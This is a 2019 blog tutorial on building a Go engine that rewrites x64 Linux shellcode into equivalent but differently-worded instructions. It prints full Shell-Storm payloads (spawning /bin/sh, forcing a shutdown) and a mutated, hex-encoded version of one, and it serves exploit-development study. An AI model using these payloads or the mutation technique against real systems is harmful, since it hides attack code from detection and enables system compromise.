
Writing a Polymorphic Engine in Golang
======================================

[

![Syscall59 — Alan Vivona](https://miro.medium.com/v2/resize:fill:64:64/1*TMZwdT6rJGwtbUISwPQy7A.jpeg)





](/@syscall59?source=post_page---byline--73ec56a2353e---------------------------------------)

[Syscall59 — Alan Vivona](/@syscall59?source=post_page---byline--73ec56a2353e---------------------------------------)

5 min read

·

Apr 8, 2019

[

](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fsyscall59%2F73ec56a2353e&operation=register&redirect=https%3A%2F%2Fmedium.com%2Fsyscall59%2Fwriting-a-polymorphic-engine-73ec56a2353e&user=Syscall59+%E2%80%94+Alan+Vivona&userId=4530e5c3828a&source=---header_actions--73ec56a2353e---------------------clap_footer------------------)

\--

1

[](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F73ec56a2353e&operation=register&redirect=https%3A%2F%2Fmedium.com%2Fsyscall59%2Fwriting-a-polymorphic-engine-73ec56a2353e&source=---header_actions--73ec56a2353e---------------------bookmark_footer------------------)

Listen

Share

On this post, we’ll see what polymorphic code is and how to write a basic polymorphic engine.

What’s Polymorphic Code?
------------------------

Polymorphic code is code that is changed on its details while keeping the final result intact (the code semantics won’t change). For example, `8/2` and `8*0.5` both achieve the same result while using different values and operations.

A polymorphic engine’s objective is to transform some shellcode into an equivalent version of itself that consists of different instructions but keeps the same functionality.

The Engine
----------

This subject is **HUGE.** In order to tackle it I defined the following scope for it:

*   It will take source code as input and produce source code as output.
*   It should work for the **Linux x64** architecture.
*   It should recognize Intel syntax.
*   It should work for Nasm files.
*   It will transform code at a **line level**. This engine is not capable of doing a file-wide analysis.
*   It will take care of operations involving registers only.
*   It’ll be written in **Go**

Press enter or click to view image in full size

Photo by [Ciel Cheng](https://unsplash.com/@catiall?utm_source=medium&utm_medium=referral) on [Unsplash](https://unsplash.com/?utm_source=medium&utm_medium=referral)

### An overview of the engine

Press enter or click to view image in full size

### The Parser section

The parser takes a line of assembly and generates an abstract representation derived from it. Let’s see how it works with an example:

**0x00 Input  
**Let’s say we get the following input:

"      mov     rax   ,   rbx     ; loads 0x59 into rax  "

**0x01 Clean**  
We need to clean this input to get just the sections we need and nothing else to ease the analysis. We cut out things like comments, extra spaces and the like.

"mov rax,rbx"

**0x02 Lexical analysis**  
In this stage, we’ll split the line into parts using delimiters like the comma and space to determine the meaning of each one of the pieces. In this case, we’ll always have an operand and 0, 1 or 2 values that can be registers or immediate values. To store the syntax I used this Go struct (comments indicate the value for the example we are working through):

type lex struct {  
  Operand                string    // "mov"  
  Values                 \[\]string  // \["rax", "rbx"\]  
  AbstractRepresentation string    // "mov $1 $2"  
  OriginalString         string    // "mov rax,rbx"  
}

### The Morph section

This section takes the responsibility of, given an abstract representation, returning an assembly line equivalent to the original. In order to do that, it makes use of a map of abstract representations and equivalences that looks like this:

map\[string\]\[\]equivalence{  
  "xor $1 $1": \[\]equivalence{  
    equivalence{  
      "mov $1, -1",  
      "inc $1",  
    },  
    equivalence{  
      "sub $1,$1",  
    },  
    ... some more equivalences for xor $1 $1  
  },  
  "mov $1 $2": \[\]equivalence{  
    equivalence{  
      "push $2",  
      "pop  $1",  
    },  
    equivalence{  
      "xchg $1, $2",  
      "push $1",  
      "pop $2",  
    },  
    ... some more equivalences for mov $1 $2  
  },  
  .. some more abstrac representations for common instructions  
 }

If a match is found in the map a random equivalence is taken and a new assembly line is returned.

Testing
-------

Let’s see the engine in action!

### 0x00 — Finding payloads

Let’s go to [Shellstorm](http://shell-storm.org/shellcode/) and grab some shellcode. I’ll use these three samples:

> **Sample1: Payload 806**

[

Linux/x86-64 - Execute /bin/sh - 27 bytes
-----------------------------------------

### \* Execute /bin/sh - 27 bytes \* Dad\` 0x7ffff7aeff20 : mov eax,0x3b ; 0x7ffff7aeff25 : syscall ; main: ;mov rbx…

shell-storm.org







](http://shell-storm.org/shellcode/files/shellcode-806.php?source=post_page-----73ec56a2353e---------------------------------------)

; SAMPLE TAKEN FROM :   
;   [http://shell-storm.org/shellcode/files/shellcode-806.php](http://shell-storm.org/shellcode/files/shellcode-806.php)  
; Execute /bin/sh - 27 bytessection .text  
global \_start\_start:  
xor rdi, rdi  
mov al, 0x69  
syscall   
xor   rdx, rdx  
mov   rbx, 0x68732f6e69622fff  
shr   rbx, 0x8  
push   rbx  
mov   rdi ,rsp  
xor   rax, rax   
push  rax  
push  rdi   
mov   rsi, rsp  
mov   al, 0x3b   
syscall  
push  0x1  
pop    rdi  
push  0x3c  
pop    rax  
syscall

> **Sample2: Payload 877**

[

Linux/x86-64 - shutdown -h now - 65 bytes
-----------------------------------------

### ; Title: shutdown -h now x86\_64 Shellcode - 65 bytes ; Platform: linux/x86\_64 ; Date: 2014-06-27 ; Author: Osanda…

shell-storm.org







](http://shell-storm.org/shellcode/files/shellcode-877.php?source=post_page-----73ec56a2353e---------------------------------------)

; SAMPLE TAKEN FROM :   
;   [http://shell-storm.org/shellcode/files/shellcode-877.php](http://shell-storm.org/shellcode/files/shellcode-877.php)  
; shutdown -h now x86\_64 Shellcode - 65 bytessection .textglobal \_start\_start:xor rax, rax  
xor rdx, rdxpush rax  
push byte 0x77  
push word 0x6f6e ; now  
mov rbx, rsppush rax  
push word 0x682d ;-h  
mov rcx, rsppush rax  
mov r8, 0x2f2f2f6e6962732f ; /sbin/shutdown  
mov r10, 0x6e776f6474756873  
push r10  
push r8  
mov rdi, rsppush rdx  
push rbx  
push rcx  
push rdi  
mov rsi, rspadd rax, 59  
syscall

> **Sample3: Payload 905**

[

Linux/x86-64 - execveat("/bin//sh") - 29 bytes
----------------------------------------------

### x86\_64 execveat("/bin//sh") 29 bytes shellcode --\[ AUTHORS \* ZadYree \* vaelio \* DaShrooms ~ Armature Technologies R&D…

shell-storm.org







](http://shell-storm.org/shellcode/files/shellcode-905.php?source=post_page-----73ec56a2353e---------------------------------------)

; SAMPLE TAKEN FROM :   
;   [http://shell-storm.org/shellcode/files/shellcode-905.php](http://shell-storm.org/shellcode/files/shellcode-905.php)  
; Execute /bin/sh - 27 bytesglobal \_start  
section .text\_start:  
push   0x42  
pop    rax  
inc    ah  
cqo  
push   rdx  
mov    rdi, 0x68732f2f6e69622f  
push   rdi  
push   rsp  
pop    rsi  
mov    r8, rdx  
mov    r10, rdx  
syscall

### 0x01 — Run them through the polymorphic engine

As easy as pipping the code through the go binary like:

**\>** **cat shellstorm-905.nasm | ../../polymorph/polymorph > shellstorm-905-poly.nasm**\-- -- --**\> cat shellstorm-905-poly.nasm**  
global \_start  
section .text\_start:  
push  0x42  
pop  rax  
inc  ah  
cqo  
push  rdx  
mov  rdi , 0x68732f2f6e69622f  
push  rdi  
push  rsp  
pop  rsi  
xor r8, r8  
add r8, rdx  
xchg r10, rdx  
push r10  
pop rdx  
syscall

Press enter or click to view image in full size

Photo by [Chad Kirchoff](https://unsplash.com/@cakirchoff?utm_source=medium&utm_medium=referral) on [Unsplash](https://unsplash.com/?utm_source=medium&utm_medium=referral)

**0x02 — Compile and generate C test skeletons**

We need to compile and generate shellcode test skeletons for each payload and its polymorphic version.

I used my custom scripts for [assembling a file](https://github.com/alanvivona/pwnshop/blob/master/utils/asm-and-link), [extracting the shellcode](https://github.com/alanvivona/pwnshop/blob/master/utils/obj2shellcode) and [generating a C binary to test the payload](https://github.com/alanvivona/pwnshop/blob/master/utils/gen-shellcode-test) to ease the process.

\# This will generate an elf64 binary from a nasm file  
**\> ../utils/asm-and-link shellstorm-905.nasm elf64**\# You can then extract the shellcode from it using this scrip  
\# It'll mark bad chars in red and provide the shellcode in a couple of formats  
**\> ../utils/obj2shellcode shellstorm-905.elf64**\# Then you take the shellcode from the previous output and pass it as a string to the gen-shellcode-test script. This one will generate a C binary that will allow you to test the shellcode**  
\> ../utils/gen-shellcode-test "\\x6a\\x42\\x58\\xfe\\xc4\\x48\\x99\\x52\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5e\\x4c\\x87\\xc2\\x41\\x50\\x5a\\x4d\\x31\\xd2\\x49\\x01\\xd2\\x0f\\x05"**

Press enter or click to view image in full size

Photo by [Bart Heird](https://unsplash.com/@bartisan?utm_source=medium&utm_medium=referral) on [Unsplash](https://unsplash.com/?utm_source=medium&utm_medium=referral)

**0x03 — The actual test**

Let’s see if these autogenerated polymorphic versions behave like the original ones:

And that’s all! The source code for the polymorphic engine can be found here:

[

alanvivona/pwnshop
------------------

### Exploit development topics. Contribute to alanvivona/pwnshop development by creating an account on GitHub.

github.com



](https://github.com/alanvivona/pwnshop/tree/master/src/0x12-SLAE-shellstorm-polymorph?source=post_page-----73ec56a2353e---------------------------------------)

[

Syscall 59 (@syscall59) | Twitter
---------------------------------
